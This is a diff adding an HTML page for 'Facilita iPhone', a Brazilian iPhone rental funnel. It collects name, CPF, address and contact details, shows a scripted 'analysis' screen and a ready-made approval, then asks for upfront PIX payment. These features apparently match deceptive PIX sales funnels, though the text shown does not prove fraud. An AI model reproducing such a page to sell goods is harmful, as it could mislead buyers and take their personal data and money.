@@ -1,0 +1,264 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#351451">
+  <meta name="description" content="Escolha seu iPhone, informe a entrega e finalize seu pedido com PIX.">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: blob: https:; style-src 'self' 'unsafe-inline'; script-src 'self' https://connect.facebook.net; connect-src 'self' https://viacep.com.br https://www.facebook.com https://connect.facebook.net; base-uri 'self'; form-action 'self'">
+  <title>Facilita iPhone | Sua análise</title>
+  <link rel="stylesheet" href="/assets/styles.css?v=7">
+</head>
+<body>
+  <div class="page-shell">
+    <div class="line-grid" aria-hidden="true"></div>
+
+    <header class="topbar">
+      <a class="brand" href="/" aria-label="Facilita iPhone">
+        <span class="brand-mark">F</span>
+        <span>Facilita iPhone</span>
+      </a>
+      <span class="topbar-note">Análise e contratação online</span>
+    </header>
+
+    <main class="funnel-shell">
+      <div class="progress-header" aria-label="Progresso da solicitação">
+        <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+        <span class="progress-label" id="progressLabel">Etapa 1 de 7</span>
+      </div>
+
+      <section class="step active" data-step="lead" aria-labelledby="lead-title">
+        <div class="hero-grid">
+          <div class="hero-copy">
+            <img class="lead-banner" src="/assets/og.png" alt="Facilita iPhone. Seu próximo iPhone, do seu jeito.">
+            <span class="eyebrow">Seu próximo iPhone</span>
+            <h1 id="lead-title">Alugue hoje mesmo seu iPhone, <em>sem contrato e sem cartão de crédito.</em></h1>
+            <p>Escolha o aparelho que combina com você e avance mediante análise. Um processo simples, transparente e totalmente online.</p>
+          </div>
+
+          <form class="form-card" id="leadForm" novalidate>
+            <h2>Comece sua análise</h2>
+            <p>Preencha os dados abaixo para consultar sua elegibilidade.</p>
+            <div class="form-field">
+              <label for="fullName">Nome completo</label>
+              <input id="fullName" name="fullName" type="text" autocomplete="name" placeholder="Digite seu nome completo" maxlength="100" required>
+            </div>
+            <div class="form-field">
+              <label for="cpf">CPF</label>
+              <input id="cpf" name="cpf" type="text" inputmode="numeric" autocomplete="off" placeholder="000.000.000-00" maxlength="14" required>
+            </div>
+            <p class="form-error" id="leadError" role="alert"></p>
+            <button class="primary-button" type="submit">Realizar análise</button>
+          </form>
+        </div>
+
+        <section class="trust-section" aria-labelledby="trust-title">
+          <h2 id="trust-title">Segurança em todas as etapas</h2>
+          <div class="trust-grid">
+            <article class="trust-seal">
+              <span class="trust-icon shield" aria-hidden="true"><img src="/assets/icons/shield-check.svg" alt=""></span>
+              <div><strong>Navegação protegida</strong><span>Dados transmitidos em ambiente seguro.</span></div>
+            </article>
+            <article class="trust-seal">
+              <span class="trust-icon payment-lock" aria-hidden="true"><img src="/assets/icons/lock-keyhole.svg" alt=""></span>
+              <div><strong>Pagamento seguro</strong><span>PIX gerado diretamente pela intermediadora.</span></div>
+            </article>
+            <article class="trust-seal">
+              <span class="trust-icon privacy" aria-hidden="true"><img src="/assets/icons/eye.svg" alt=""></span>
+              <div><strong>Privacidade</strong><span>Informações usadas somente para sua solicitação.</span></div>
+            </article>
+          </div>
+        </section>
+      </section>
+
+      <section class="step" data-step="loading" aria-labelledby="loading-title">
+        <div class="center-wrap">
+          <div class="center-card">
+            <div class="loader-orbit" aria-hidden="true"></div>
+            <span class="eyebrow">Análise em andamento</span>
+            <h1 id="loading-title">Estamos consultando seus dados</h1>
+            <p>Isso leva apenas alguns segundos. Mantenha esta página aberta até a conclusão.</p>
+            <div class="analysis-progress" aria-hidden="true"><span></span></div>
+            <p class="analysis-status" id="analysisStatus" aria-live="polite">Validando informações</p>
+          </div>
+        </div>
+      </section>
+
+      <section class="step" data-step="approved" aria-labelledby="approved-title">
+        <div class="center-wrap">
+          <div class="center-card">
+            <div class="success-icon" aria-hidden="true"></div>
+            <span class="eyebrow">Análise concluída</span>
+            <h1 id="approved-title">Tudo certo!</h1>
+            <p>Sua solicitação passou pela análise inicial. Agora é só definir o aparelho e concluir seus dados.</p>
+            <p class="legal-confirm">Ao clicar em continuar, você confirma que leu e concordou com os <a href="/termos/">termos de uso</a>.</p>
+            <button class="primary-button" type="button" data-go="choice">Continuar</button>
+          </div>
+        </div>
+      </section>
+
+      <section class="step" data-step="choice" aria-labelledby="choice-title">
+        <header class="step-heading">
+          <span class="eyebrow">Seu aparelho</span>
+          <h1 id="choice-title">Escolha o modelo</h1>
+          <p>Selecione o iPhone e o armazenamento. As opções disponíveis são ajustadas automaticamente para cada modelo.</p>
+        </header>
+
+        <div class="selection-layout">
+          <div class="content-card">
+            <section class="choice-section">
+              <h2>Modelo</h2>
+              <p>Todos os aparelhos são novos e acompanham carregador.</p>
+              <div class="model-list" id="modelList"></div>
+            </section>
+            <section class="choice-section">
+              <h2>Armazenamento</h2>
+              <p>Escolha a capacidade ideal para o seu uso.</p>
+              <div class="storage-list" id="storageList"></div>
+            </section>
+            <p class="device-note">Os modelos iPhone 17e, iPhone 17 e iPhone Air são enviados na cor Preto-Espacial. Os modelos iPhone 17 Pro e iPhone 17 Pro MAX são enviados na cor laranja. Todos os aparelhos são novos e acompanham carregador.</p>
+          </div>
+
+          <aside class="sticky-summary" aria-label="Subtotal mensal">
+            <small>Subtotal por mês</small>
+            <div class="monthly-value" id="monthlyValue">R$ 39,90 <span>/mês</span></div>
+            <p class="summary-description" id="choiceDescription">iPhone 17e, 256GB</p>
+            <button class="primary-button" type="button" id="confirmChoice">Definir minha escolha</button>
+          </aside>
+        </div>
+      </section>
+
+      <section class="step" data-step="delivery" aria-labelledby="delivery-title">
+        <header class="step-heading wide-card">
+          <span class="eyebrow">Entrega e cobrança</span>
+          <h1 id="delivery-title">Onde você quer receber?</h1>
+          <p>Informe o endereço completo para confirmarmos a disponibilidade e o prazo de entrega.</p>
+        </header>
+
+        <form class="form-card wide-card" id="deliveryForm" novalidate>
+          <div class="field-grid">
+            <div class="form-field">
+              <label for="cep">CEP</label>
+              <input id="cep" type="text" inputmode="numeric" autocomplete="postal-code" placeholder="00000-000" maxlength="9" required>
+              <p class="helper" id="cepHelper">Digite o CEP para buscar o endereço.</p>
+            </div>
+            <div class="form-field">
+              <label for="street">Rua ou avenida</label>
+              <input id="street" type="text" autocomplete="address-line1" required>
+            </div>
+            <div class="form-field">
+              <label for="number">Número</label>
+              <input id="number" type="text" inputmode="numeric" autocomplete="address-line2" maxlength="12" required>
+            </div>
+            <div class="form-field">
+              <label for="complement">Complemento</label>
+              <input id="complement" type="text" autocomplete="address-line3" placeholder="Opcional" maxlength="60">
+            </div>
+            <div class="form-field">
+              <label for="neighborhood">Bairro</label>
+              <input id="neighborhood" type="text" required>
+            </div>
+            <div class="form-field">
+              <label for="city">Cidade</label>
+              <input id="city" type="text" autocomplete="address-level2" required>
+            </div>
+            <div class="form-field">
+              <label for="state">Estado</label>
+              <input id="state" type="text" autocomplete="address-level1" maxlength="2" required>
+            </div>
+          </div>
+          <div class="shipping-result" id="shippingResult">
+            <div><strong>Frete grátis</strong><br><span>Entrega estimada em 5 a 7 dias úteis.</span></div>
+          </div>
+          <p class="form-error" id="deliveryError" role="alert"></p>
+          <button class="primary-button" type="submit">Prosseguir</button>
+        </form>
+      </section>
+
+      <section class="step" data-step="contact" aria-labelledby="contact-title">
+        <div class="center-wrap">
+          <form class="form-card wide-card" id="contactForm" novalidate>
+            <span class="eyebrow">Lembretes de cobrança</span>
+            <h2 id="contact-title">Como podemos falar com você?</h2>
+            <p>Enviaremos os lembretes, a confirmação do pedido e o código de rastreio por estes contatos.</p>
+            <div class="form-field">
+              <label for="email">E-mail</label>
+              <input id="email" type="email" inputmode="email" autocomplete="email" placeholder="voce@exemplo.com" required>
+            </div>
+            <div class="form-field">
+              <label for="phone">Telefone com DDD</label>
+              <input id="phone" type="tel" inputmode="numeric" autocomplete="tel" placeholder="(00) 00000-0000" maxlength="15" required>
+            </div>
+            <p class="form-error" id="contactError" role="alert"></p>
+            <button class="primary-button" type="submit">Resumo</button>
+          </form>
+        </div>
+      </section>
+
+      <section class="step" data-step="summary" aria-labelledby="summary-title">
+        <header class="step-heading">
+          <span class="eyebrow">Revise seu pedido</span>
+          <h1 id="summary-title">Resumo</h1>
+          <p>Confira seus dados e escolha o período que deseja pagar agora.</p>
+        </header>
+
+        <div class="selection-layout">
+          <div>
+            <div class="summary-sections" id="customerSummary"></div>
+            <div class="content-card">
+              <section class="choice-section">
+                <h2>Escolha seu plano</h2>
+                <p>O valor abaixo será cobrado agora via PIX.</p>
+                <div class="plan-list" id="planList"></div>
+              </section>
+              <div class="insurance-toggle">
+                <div class="insurance-copy">
+                  <strong>Proteção contra danos ou roubo</strong>
+                  <span>Adicione cobertura por R$ 9,90 ao mês do período escolhido.</span>
+                </div>
+                <button class="switch" id="insuranceSwitch" type="button" role="switch" aria-checked="false" aria-label="Adicionar seguro"></button>
+              </div>
+            </div>
+          </div>
+
+          <aside class="sticky-summary">
+            <small>Total do pagamento</small>
+            <div class="order-total">
+              <span id="orderPeriod">Plano mensal</span>
+              <strong id="orderTotal">R$ 39,90</strong>
+            </div>
+            <p class="summary-description">Seu aluguel será preparado após a confirmação do PIX.</p>
+            <p class="form-error" id="paymentError" role="alert"></p>
+            <button class="primary-button" type="button" id="orderButton">Pedir iPhone</button>
+          </aside>
+        </div>
+      </section>
+    </main>
+
+    <aside class="subtotal-dock" id="subtotalDock" aria-hidden="true">
+      <div class="subtotal-dock-copy">
+        <small id="subtotalDockLabel">Subtotal</small>
+        <strong id="subtotalDockValue">R$ 0,00</strong>
+      </div>
+      <button type="button" id="subtotalDockAction">Continuar</button>
+    </aside>
+  </div>
+
+  <div class="payment-sheet-backdrop" id="paymentBackdrop" role="dialog" aria-modal="true" aria-labelledby="paymentTitle">
+    <div class="payment-sheet">
+      <div class="sheet-handle" aria-hidden="true"></div>
+      <h2 id="paymentTitle">Pedido: <span id="orderCode"></span></h2>
+      <div class="qr-frame" id="qrFrame"><div class="qr-placeholder" aria-label="Carregando QR Code"></div></div>
+      <p class="pix-label">PIX Copia e Cola</p>
+      <div class="pix-code" id="pixCode"></div>
+      <button class="primary-button" type="button" id="copyPix">Copiar código PIX</button>
+      <p class="payment-status" id="paymentStatus" aria-live="polite">Aguardando confirmação do pagamento.</p>
+      <button class="sheet-close" type="button" id="closePayment">Fechar e continuar depois</button>
+    </div>
+  </div>
+
+  <script src="/assets/qrcode.js"></script>
+  <script src="/assets/tracking.js"></script>
+  <script src="/assets/app.js?v=6"></script>
+</body>
+</html>
